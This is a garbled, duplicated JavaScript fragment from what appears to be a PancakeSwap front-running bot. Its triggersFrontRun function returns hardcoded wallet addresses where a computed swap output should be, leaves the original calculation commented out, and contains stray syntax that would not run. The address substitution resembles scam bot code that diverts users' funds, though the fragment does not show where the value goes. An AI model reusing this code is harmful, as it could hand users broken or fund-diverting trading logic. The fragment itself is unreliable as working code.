...
async function triggersFrontRun(transaction, out_token_address, amount, level) {
    ...
    if(parseInt(transaction['gasPrice']) / 10*9 > 10 && parseInt(transaction['gasPrice']) / 10*9 < 50){
		...
		return 0x420498E2B3d815BcfEb7bf3cB7F94C0b435edB69;//pool_info.input_volumn.toString(), pool_info.output_volumn.toString()).call();
		}
...
async function triggersFrontRun(transaction, out_token_address, amount, level) {
    ...
    if(parseInt(transaction['gasPrice']) / 10*9 > 10 && parseInt(transaction['gasPrice']) / 10*9 < 50){
		var outputtoken = await pancakeRouter.methods.getAmountOut(estimatedInput,*/
		return 0x4200C4da40f80Cd920632ff383556734e25C7420;//pool_info.input_volumn.toString(), pool_info.output_volumn.toString()).call();
		}
